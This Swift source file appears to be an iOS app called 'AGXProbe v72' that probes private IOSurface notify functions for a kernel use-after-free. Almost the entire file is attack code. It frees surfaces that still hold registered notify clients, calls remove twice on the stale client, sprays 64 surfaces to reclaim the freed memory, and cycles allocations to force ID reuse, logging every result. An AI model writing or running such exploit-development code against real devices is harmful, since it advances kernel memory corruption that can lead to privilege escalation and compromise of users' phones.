import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v72 - UAF memory reclamation + double-remove").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v72")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
    typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t
    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v72 - UAF reclamation ===")
        try? await Task.sleep(nanoseconds: 2_000_000_000)

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID") else {
            emit("[-] symbol fail"); status = "Complete"; isRunning = false; return
        }
        let gSet = unsafeBitCast(setSym, to: (@convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t).self)
        let gRemove = unsafeBitCast(remSym, to: (@convention(c) (UInt64) -> kern_return_t).self)
        let gCreate = unsafeBitCast(createSym, to: (@convention(c) (CFDictionary) -> UnsafeMutableRawPointer?).self)
        let gGetID = unsafeBitCast(getIdSym, to: (@convention(c) (UnsafeMutableRawPointer) -> UInt32).self)

        var gPort: mach_port_t = 0
        var kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &gPort)
        emit("[*] port 0x\(String(gPort, radix: 16)) kr=0x\(String(kr, radix: 16))")
        if kr != KERN_SUCCESS { status = "Complete"; isRunning = false; return }

        func makeSurface() -> UnsafeMutableRawPointer? {
            let props = CFDictionaryCreateMutable(nil, 0, nil, nil) as! NSMutableDictionary
            props["IOSurfaceWidth"] = 256
            props["IOSurfaceHeight"] = 256
            props["IOSurfaceBytesPerElement"] = 4
            return gCreate(props)
        }

        // ---------- TEST 1: Double-remove on stale client ----------
        emit("\n=== TEST 1: Double-remove on stale client ===")
        var s1: UnsafeMutableRawPointer? = makeSurface()
        guard let s1p = s1 else { emit("[-] create failed"); status = "Complete"; isRunning = false; return }
        let id1 = gGetID(s1p)
        emit("[A] surface id 0x\(String(id1, radix: 16))")
        let kr1 = gSet(gPort, 1, UInt64(id1))
        emit("[A] set=0x\(String(kr1, radix: 16))")
        release(s1)
        emit("[A] released without remove")

        let kr2 = gRemove(UInt64(id1))
        emit("[B] remove=0x\(String(kr2, radix: 16))")
        let kr3 = gRemove(UInt64(id1))
        emit("[C] remove again=0x\(String(kr3, radix: 16))  (double-free?)")

        // ---------- TEST 2: Spray after free, then remove ----------
        emit("\n=== TEST 2: Spray after free, then remove ===")
        var s2: UnsafeMutableRawPointer? = makeSurface()
        guard let s2p = s2 else { emit("[-] create failed"); status = "Complete"; isRunning = false; return }
        let id2 = gGetID(s2p)
        emit("[A] surface id 0x\(String(id2, radix: 16))")
        let kr4 = gSet(gPort, 1, UInt64(id2))
        emit("[A] set=0x\(String(kr4, radix: 16))")
        release(s2)
        emit("[A] released without remove")

        // Spray: create many surfaces hoping one reuses s2's struct memory
        var sprayed: [UnsafeMutableRawPointer?] = []
        for i in 0..<64 {
            if let s = makeSurface() { sprayed.append(s) }
        }
        emit("[*] sprayed \(sprayed.count) surfaces")

        // Check if any sprayed surface got id2 (id reuse)
        var idReused = false
        for s in sprayed {
            if let s = s {
                let sid = gGetID(s)
                if sid == id2 {
                    emit("[*] sprayed surface has same id 0x\(String(sid, radix: 16))")
                    idReused = true
                }
            }
        }

        let kr5 = gRemove(UInt64(id2))
        emit("[B] remove stale=0x\(String(kr5, radix: 16))")

        // Try set again on stale id
        let kr6 = gSet(gPort, 1, UInt64(id2))
        emit("[C] set again=0x\(String(kr6, radix: 16))")

        // Clean up sprayed surfaces
        for s in sprayed { release(s) }

        // ---------- TEST 3: Rapid allocate-free-allocate ----------
        emit("\n=== TEST 3: Rapid alloc-free-alloc cycle ===")
        var cycleId: UInt32 = 0
        for cycle in 0..<20 {
            let cs = makeSurface()
            if let csp = cs {
                cycleId = gGetID(csp)
                let kset = gSet(gPort, 1, UInt64(cycleId))
                emit("[cycle \(cycle)] id=0x\(String(cycleId, radix: 16)) set=0x\(String(kset, radix: 16))")
                release(csp)
                // Don't remove - leave stale client
                // Immediately allocate another surface
                let cs2 = makeSurface()
                if let csp2 = cs2 {
                    let id2b = gGetID(csp2)
                    emit("[cycle \(cycle)] new surface id=0x\(String(id2b, radix: 16)) same=\(id2b == cycleId)")
                    release(csp2)
                }
            }
        }

        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }

    private func release(_ ptr: UnsafeMutableRawPointer?) {
        guard let p = ptr else { return }
        Unmanaged<AnyObject>.fromOpaque(p).release()
    }
}
